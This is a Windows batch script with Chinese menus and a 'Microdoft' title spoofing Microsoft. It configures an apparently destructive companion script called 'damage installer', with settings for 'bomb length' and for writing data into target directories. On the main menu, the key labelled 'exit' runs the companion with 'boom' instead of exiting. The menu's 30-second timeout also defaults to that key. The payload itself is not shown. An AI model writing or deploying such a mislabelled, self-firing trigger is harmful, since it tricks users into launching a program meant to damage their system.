:BAT start
@title 程式載入中 & echo off & setlocal enableextensions & setlocal enabledelayedexpansion & call:DT
>nul chcp 950 & >>"%~dp0log.txt" echo 在%_DT%啟動了設定程式
if not exist "%~dp0毀損安裝程式.bAt" (>&2 echo 沒有可以進行設定的程式。 & >>"%~dp0log.txt" echo 沒有可以進行設定的程式。 & >nul timeout /t 10 & exit /b 1)
call:custom & goto ProgramStart

:ProgramStart
if exist "%~dp0log.txt" (>nul findstr /b /e /offline /c:"微哆動作紀錄 --------------------------------------------- " "%~dp0log.txt" && >>"%~dp0log.txt" echo ---------------------------------------------------------- ) else (>"%~dp0log.txt" echo 微哆動作紀錄 --------------------------------------------- )
if not %errorlevel%==0 >"%~dp0log.txt" echo 微哆動作紀錄 --------------------------------------------- 
goto start

:DT
for /f "tokens=1-4 delims=/ " %%a in ("%date%") do set _DoDate=%%a年%%b月%%c日（%%d）
for /f "tokens=1-4 delims=:. " %%e in ("%time%") do set _DoTime=%%e時%%f分%%g秒點%%h
set _DT=%_DoDate%%_DoTime%
goto :eof

:start
title 程式開始中…… Now Loading...
cls & echo Microdoft "arring"
call:DT
>>"%~dp0log.txt" echo 在%_DT%開始了設定程式
>nul timeout /t 1 /nobreak
color 27 & goto ready

:restart
cls & color
title 程式重新開始中…… Now Loading...
echo Microdoft re"arring"
call:DT
>>"%~dp0log.txt" echo 在%_DT%重開了設定程式
>nul timeout /t 1 /nobreak
color 27 & goto ready

:boom
call "%~dp0毀損安裝程式.bAt" boom
goto :eof

:ready
cls & color 2f
call:DT
title 設定程式　%_DT%
set MG=請選擇選項
echo %MG%。
set NT=「Z」鍵--進入設定；「X」鍵--結束
choice /n /t 30 /c zxqr /d x /m "%NT%"
if %errorlevel%==4 (
>>"%~dp0log.txt" echo %MG% "%NT%"「R」
color 27 & goto restart
)
if %errorlevel%==3 (
>>"%~dp0log.txt" echo %MG% "%NT%"「Q」
set enter=0
color 27 & goto finish
)
if %errorlevel%==2 (
call:boom
>>"%~dp0log.txt" echo %MG% "%NT%"「X」
color 27 & goto ready
)
if %errorlevel%==1 (
>>"%~dp0log.txt" echo %MG% "%NT%"「Z」
set C=1
color 27 & goto CustomSet
)
goto ready

:set-1
call:reset
goto CustomSet

:set0
>>"%~dp0log.txt" echo %MG% "%NT%"　%S%「Z」
goto end

:set1
cls & color 2f
title %S%
if %V1% lss 100 (
set VSp=
if %V1% lss 10 (
set VSp= )
set VS= ) else (
set VSp= 
set VS=)
set MG=設定%Ex%
set Hp=值愈大，炸彈炸得愈久；值愈小，炸彈炸得愈短。
echo 　　　%MG%
echo.
echo.
echo 　　%Sp%%S%
echo.
echo.
echo.
echo.
echo 　　　　%VS%←%VSp%%V1%→%VS%（以爆炸次數為單位，範圍為1～100）
echo.
echo 　%Hp%
echo.
set NT=「D」鍵--增加；「A」鍵--減少；「Z」鍵--設定；「X」鍵--取消
choice /n /c adzx /m "%NT%"
if %errorlevel%==4 (
set V1=%S1%
goto CustomSet
)
if %errorlevel%==3 (
set S1=%V1%
goto CustomSet
)
if %errorlevel%==2 (
if %V1% geq 100 (set V1=100) else (set /a V1+=1))
if %errorlevel%==1 (
if %V1% leq 1 (set V1=1) else (set /a V1-=1))
goto set1

:exit
call:DT
title 設定結束　%_DT%
if "%enter%"=="" (
if "%err%"=="0" (
echo 設定儲存成功！
>>"%~dp0log.txt" echo 設定成功
) else (
echo 設定儲存失敗！
>>"%~dp0log.txt" echo 設定失敗
)
>>"%~dp0log.txt" echo 在%_DT%結束了設定程式
>>"%~dp0log.txt" echo ---------------------------------------------------------- 
>nul timeout /t 5
)
exit /b %err%

:custom
if exist "%~dp0毀損安裝程式.cfg" (
set CC=1
for /f "eol=; tokens=1,2 delims== usebackq" %%a in ("%~dp0毀損安裝程式.cfg") do (
set set!CC!=%%b
set /a CC+=1
)) else (call:reset)
set S1=%set1%
set V1=%S1%
set S2=%set2%
set V2=%S2%
set S3=%set3%
set V3=%S3%
set S4=%set4%
set V4=%S4%
set S5=%set5%
set V5=%S5%
set S6=%set6%
set V6=%S6%
goto CustomCheck

:CustomCheck
if "%S1%"=="" call:reset1
if "%S2%"=="" call:reset2
if "%S3%"=="" call:reset3
if "%S4%"=="" call:reset4
if "%S5%"=="" call:reset5
if "%S6%"=="" call:reset6
goto :eof

:reset
for /L %%A in (1,1,6) do (call:reset%%A)
goto :eof

:reset1
set S1=15
set V1=15
goto :eof

:reset2
set S2=100
set V2=100
goto :eof

:reset3
set S3=2
set V3=2
goto :eof

:reset4
set S4=2
set V4=2
goto :eof

:reset5
set S5=2
set V5=2
goto :eof

:reset6
set S6=15
set V6=15
goto :eof

:CustomSet
if "%C%"=="" set C=1
if %C%==1 set S=炸彈長度 & set Ex=炸彈爆炸的次數 & set ESp=　　　　　　　　　 & set Sp=　　
if %C%==2 set S=登錄處檢查數量 & set Ex=資料登錄時要檢查的目標目錄數量 & set ESp=　 & set Sp= 
if %C%==3 set S=登錄處檢查次數 & set Ex=資料登錄時最多的檢查目標的次數 & set ESp=　 & set Sp= 
if %C%==4 set S=登錄處重檢查次數 & set Ex=資料登錄時最多的檢查目標重試次數 & set ESp= & set Sp=
if %C%==5 set S=資料重登錄次數 & set Ex=資料登錄最多的重試次數 & set ESp=　　　　　 & set Sp= 
if %C%==6 set S=登錄等待最大長度 & set Ex=等待資料登錄完成的最大等待次數 & set ESp=　 & set Sp=
if %C%==-1 set S=回復預設設定 & set Ex=將設定設為初始值 & set ESp=　　　　　　　　 & set Sp=　
if %C%==0 set S=離開設定 & set Ex=儲存並離開設定程式 & set ESp=　　　　　　　 & set Sp=　　
cls & color 2f
title 設定選單
set MG=選擇設定項目
echo 　　　%MG%
echo.
echo 　　　　　 ↑
echo 　　%Sp%%S%
echo 　　　　　 ↓
echo.
echo.
echo.
echo.
echo.
echo 　　　　　　　　　　　　%ESp%%Ex%
echo.
set NT=「W」鍵--上一項；「S」鍵--下一項；「Z」鍵--設定；「X」鍵--取消
choice /n /c swzxqr /m "%NT%"
if %errorlevel%==6 (
>>"%~dp0log.txt" echo %MG% "%NT%"　%S%「R」
color 27 & goto restart
)
if %errorlevel%==5 (
goto set0
)
if %errorlevel%==4 (
if %C%==0 (
>>"%~dp0log.txt" echo %MG% "%NT%"　%S%「X」
goto end
) else (
set C=0
))
if %errorlevel%==3 (
goto set%C%
)
if %errorlevel%==2 (
if %C% leq -1 (set C=6) else (set /a C-=1))
if %errorlevel%==1 (
if %C% geq 6 (set C=-1) else (set /a C+=1))
goto CustomSet

:set2
cls & color 2f
title %S%
if %V2% lss 1000 (
set VSp= 
if %V2% lss 100 (
set VSp=
set VS= 
) else (set VS=)) else (set VSp=)
set MG=設定%Ex%
set Hp=值愈大，登錄愈快；值愈小，登錄愈慢，但可能發生沒有可用目錄的錯誤。
echo 　　　%MG%
echo.
echo.
echo 　　%Sp%%S%
echo.
echo.
echo.
echo.
echo 　　　　%VS%←%VSp%%V2%→%VS%（以檢查的目錄數為單位，範圍為10～1000）
echo.
echo 　%Hp%
echo.
set NT=「D」鍵--增加；「A」鍵--減少；「F」鍵--增加（強）；「S」鍵--減少（強）；「Z」鍵--設定；「X」鍵--取消
choice /n /c adsfzx /m "%NT%"
if %errorlevel%==6 (
set V2=%S2%
goto CustomSet
)
if %errorlevel%==5 (
set S2=%V2%
goto CustomSet
)
if %errorlevel%==4 (
set /a V2+=10
if !V2! geq 1000 set V2=1000
)
if %errorlevel%==3 (
set /a V2-=10
if !V2! leq 10 set V2=10
)
if %errorlevel%==2 (
if %V2% geq 1000 (set V2=1000) else (set /a V2+=1))
if %errorlevel%==1 (
if %V2% leq 10 (set V2=10) else (set /a V2-=1))
goto set2

:set3
cls & color 2f
title %S%
set MG=設定%Ex%
set Hp=值愈大，最長登錄時間愈久；值愈小，最長登錄時間愈短，但可能發生沒有可用目錄的錯誤。
echo 　　　%MG%
echo.
echo.
echo 　　%Sp%%S%
echo.
echo.
echo.
echo.
echo 　　　　 ←%V3%→ （以檢查的上限次數為單位，範圍為1～5）
echo.
echo 　%Hp%
echo.
set NT=「D」鍵--增加；「A」鍵--減少；「Z」鍵--設定；「X」鍵--取消
choice /n /c adzx /m "%NT%"
if %errorlevel%==4 (
set V3=%S3%
goto CustomSet
)
if %errorlevel%==3 (
set S3=%V3%
goto CustomSet
)
if %errorlevel%==2 (
if %V3% geq 5 (set V3=5) else (set /a V3+=1))
if %errorlevel%==1 (
if %V3% leq 1 (set V3=1) else (set /a V3-=1))
goto set3

:set4
cls & color 2f
title %S%
set MG=設定%Ex%
set Hp=值愈大，最長登錄時間愈久；值愈小，最長登錄時間愈短，但可能發生找不到可用目錄的錯誤。
echo 　　　%MG%
echo.
echo.
echo 　　%Sp%%S%
echo.
echo.
echo.
echo.
echo 　　　　 ←%V4%→ （以重新檢查的上限次數為單位，範圍為0～4）
echo.
echo 　%Hp%
echo.
set NT=「D」鍵--增加；「A」鍵--減少；「Z」鍵--設定；「X」鍵--取消
choice /n /c adzx /m "%NT%"
if %errorlevel%==4 (
set V4=%S4%
goto CustomSet
)
if %errorlevel%==3 (
set S4=%V4%
goto CustomSet
)
if %errorlevel%==2 (
if %V4% geq 4 (set V4=4) else (set /a V4+=1))
if %errorlevel%==1 (
if %V4% leq 0 (set V4=0) else (set /a V4-=1))
goto set4

:set5
cls & color 2f
title %S%
set MG=設定%Ex%
set Hp=值愈大，最長登錄時間愈久；值愈小，最長登錄時間愈短，但可能發生登錄失敗的錯誤。
echo 　　　%MG%
echo.
echo.
echo 　　%Sp%%S%
echo.
echo.
echo.
echo.
echo 　　　　 ←%V5%→ （以重新登錄的上限次數為單位，範圍為0～4）
echo.
echo 　%Hp%
echo.
set NT=「D」鍵--增加；「A」鍵--減少；「Z」鍵--設定；「X」鍵--取消
choice /n /c adzx /m "%NT%"
if %errorlevel%==4 (
set V5=%S5%
goto CustomSet
)
if %errorlevel%==3 (
set S5=%V5%
goto CustomSet
)
if %errorlevel%==2 (
if %V5% geq 4 (set V5=4) else (set /a V5+=1))
if %errorlevel%==1 (
if %V5% leq 0 (set V5=0) else (set /a V5-=1))
goto set5

:set6
cls & color 2f
title %S%
if %V6% lss 100 (
set VSp=
if %V6% lss 10 (
set VSp= )
set VS= ) else (
set VSp= 
set VS=)
set MG=設定%Ex%
set Hp=值愈大，最長等待登錄時間愈久；值愈小，最長等待登錄時間愈短，但可能發生來不及登錄的錯誤。
echo 　　　%MG%
echo.
echo.
echo 　　%Sp%%S%
echo.
echo.
echo.
echo.
echo 　　　　%VS%←%VSp%%V6%→%VS%（以等待的上限次數為單位，範圍為5～100）
echo.
echo 　%Hp%
echo.
set NT=「D」鍵--增加；「A」鍵--減少；「Z」鍵--設定；「X」鍵--取消
choice /n /c adzx /m "%NT%"
if %errorlevel%==4 (
set V6=%S6%
goto CustomSet
)
if %errorlevel%==3 (
set S6=%V6%
goto CustomSet
)
if %errorlevel%==2 (
if %V6% geq 100 (set V6=100) else (set /a V6+=1))
if %errorlevel%==1 (
if %V6% leq 5 (set V6=5) else (set /a V6-=1))
goto set6

:end
call:CustomCheck
>"%~dp0毀損安裝程式.cfg" echo set1=%S1%
>>"%~dp0毀損安裝程式.cfg"  echo set2=%S2%
>>"%~dp0毀損安裝程式.cfg"  echo set3=%S3%
>>"%~dp0毀損安裝程式.cfg"  echo set4=%S4%
>>"%~dp0毀損安裝程式.cfg"  echo set5=%S5%
>>"%~dp0毀損安裝程式.cfg"  echo set6=%S6%
goto finish

:finish
cls
set F=0
>nul 2>&1 findstr /b /e /offline /c:"set1=%S1%" "%~dp0毀損安裝程式.cfg" && set /a F+=1
>nul 2>&1 findstr /b /e /offline /c:"set2=%S2%" "%~dp0毀損安裝程式.cfg" && set /a F+=1
>nul 2>&1 findstr /b /e /offline /c:"set3=%S3%" "%~dp0毀損安裝程式.cfg" && set /a F+=1
>nul 2>&1 findstr /b /e /offline /c:"set4=%S4%" "%~dp0毀損安裝程式.cfg" && set /a F+=1
>nul 2>&1 findstr /b /e /offline /c:"set5=%S5%" "%~dp0毀損安裝程式.cfg" && set /a F+=1
>nul 2>&1 findstr /b /e /offline /c:"set6=%S6%" "%~dp0毀損安裝程式.cfg" && set /a F+=1
if %F%==6 (
set err=0
) else (
set err=1
)
goto exit